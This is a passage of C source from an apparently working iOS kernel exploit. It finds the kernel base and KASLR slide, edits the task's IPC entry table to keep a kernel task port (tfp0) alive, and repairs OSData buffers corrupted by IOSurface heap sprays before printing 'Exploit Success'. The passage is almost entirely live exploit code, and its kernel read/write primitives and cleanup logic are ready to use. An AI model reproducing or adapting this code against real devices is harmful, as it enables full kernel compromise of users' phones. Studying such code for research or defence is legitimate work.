    INFO("getExternalTrapForIndex_func = 0x%llx\n", getExternalTrapForIndex_func);
    uint64_t page = trunc_page_kernel(getExternalTrapForIndex_func);
   
    while (true) {
        if (kread64(page) == 0x0100000cfeedfacf && (kread64(page + 8) == 0x0000000200000000 || kread64(page + 8) == 0x0000000200000002)) {
            kbase = page;
            kslide = kbase - 0xfffffff007004000;
            break;
        }
        page -= pagesize;
    }
    
    printf("[*] Kernel base: 0x%llx\n", kbase);

   // ----------- clean up ----------- //

    printf("[-] Cleaning up...\n");
    uint64_t our_task_addr = kread64(our_port_addr + off_ipc_port_ip_kobject);
    uint64_t itk_space = kread64(our_task_addr + off_task_itk_space);
    uint64_t is_table = kread64(itk_space + off_ipc_space_is_table);
    
    uint32_t port_index = fakeport >> 8;
    const int sizeof_ipc_entry_t = 0x18;
    
    // remove references to the first tfp0 port which is located in the command buffer
    kwrite32(is_table + (port_index * sizeof_ipc_entry_t) + 8, 0);
    kwrite64(is_table + (port_index * sizeof_ipc_entry_t), 0);
    fakeport = MACH_PORT_NULL;

    // remove our receive right of new_tfp0 to prevent it from dying on app exit
    port_index = new_tfp0 >> 8;
    uint32_t ie_bits = kread32(is_table + (port_index * sizeof_ipc_entry_t) + 8);
    ie_bits &= ~MACH_PORT_TYPE_RECEIVE;
    kwrite32(is_table + (port_index * sizeof_ipc_entry_t) + 8, ie_bits);

    uint64_t spray_array = address_of_property_key(IOSurfaceRootUserClient, spray_buffer_key); // OSArray *
    uint32_t capacity = OSArray_getCapacity(spray_array);
    for (int i = 0; i < capacity; i++) {
        uint64_t object = OSArray_objectAtIndex(spray_array, i); // OSData *
        uint64_t buffer = OSData_buffer(object);
        if (buffer == segment_list_addr + 96 MB + 96 MB + 8 * pagesize) {   // check if address that spray_buffer is in
            printf("[*] Found corrupted OSData buffer at 0x%llx\n", buffer);
            OSData_setCapacity(object, 0); // null out the capacity, this buffer was freed & reallocated
            break;
        }
    }
    // now we should be able to free this
    IOSurface_remove_property(spray_buffer_key);

    uint64_t ool_array = address_of_property_key(IOSurfaceRootUserClient, ool_ports_realloc_buffer_key); // OSArray *
    capacity = OSArray_getCapacity(ool_array);
    for (int i = 0; i < capacity; i++) {
        uint64_t object = OSArray_objectAtIndex(ool_array, i); // OSData *
        uint64_t buffer = OSData_buffer(object);
        if (buffer == segment_list_addr + 96 MB + 96 MB + 8 * pagesize + 8 * pagesize) {    //check if address that oolports is in
            printf("[*] Found corrupted OSData buffer at 0x%llx\n", buffer);
            OSData_setCapacity(object, 0);
            break;
        }
    }
    IOSurface_remove_property(ool_ports_realloc_buffer_key);

    // in here only part of the buffer got freed, we don't know how much so the solution is more complex.
    // we need to check if each page is mapped and if so check if it was allocated by us and not freed and reallocated by the system.
    // when we find a page allocated by us it is safe to assume there won't be more corrupted pages since the corruption is contiguous
    uint64_t kfree_array = address_of_property_key(IOSurfaceRootUserClient, kfree_buffer_key); // OSArray *
    capacity = OSArray_getCapacity(kfree_array);
    
    uint64_t start_of_corruption = segment_list_addr + 96 MB + 96 MB + 8 * pagesize + 8 * pagesize + 8 * pagesize;
    
    for (int i = 0; i < capacity; i++) {
        uint64_t object = OSArray_objectAtIndex(kfree_array, i); // OSData *
        uint64_t buffer = OSData_buffer(object);
    
        if (buffer >= start_of_corruption) {
            uint64_t page = 0;
            
            // 8 pages
            for (int p = 0; p < 8; p++) {
                page = buffer + p * pagesize;
                
                // if allocation doesn't work page is mapped, otherwise it's free
                ret = mach_vm_allocate(new_tfp0, &page, pagesize, VM_FLAGS_FIXED); // reallocate at same address
                if (ret) {
                    uint64_t readval = kread64(page);
                    if (readval == 0x4242424242424242) {
                        printf("[*] Fixing corrupted OSData buffer at 0x%llx\n", buffer);
                        
                        // fix it
                        OSData_setBuffer(object, page);
                        OSData_setCapacity(object, 8 * pagesize - (uint32_t)(page - buffer));
                        
                        // if we find a non-corrupted buffer stop
                        goto out;
                    }
                    else {
                        printf("[*] Part of buffer reallocated by the system, keeping\n");
                    }
                }
                else {
                    kfree(page, pagesize); // was freed already, so keep it freed
                }
            }
            
            // if we've reached this point object is corrupted entirely
            OSData_setCapacity(object, 0);
        }
    }
    
out:;
    IOSurface_remove_property(kfree_buffer_key);

    // INFO("DONE, spinning here...\n");
    SUCCESS("Exploit Success\n");
    // getchar();

err:
	// clean 200 ports
	for (int i = 0; i < port_cnt; i++) {
        if (ports[i] && ports[i] != new_tfp0) mach_port_destroy(mach_task_self(), ports[i]);
    }
	
#if ENABLE_HELPER
    term_kexecute();    //helper
#endif

if (data) free(data);

	IOAccelerator_deinit();
	IOSurface_deinit();
	return 0;
}
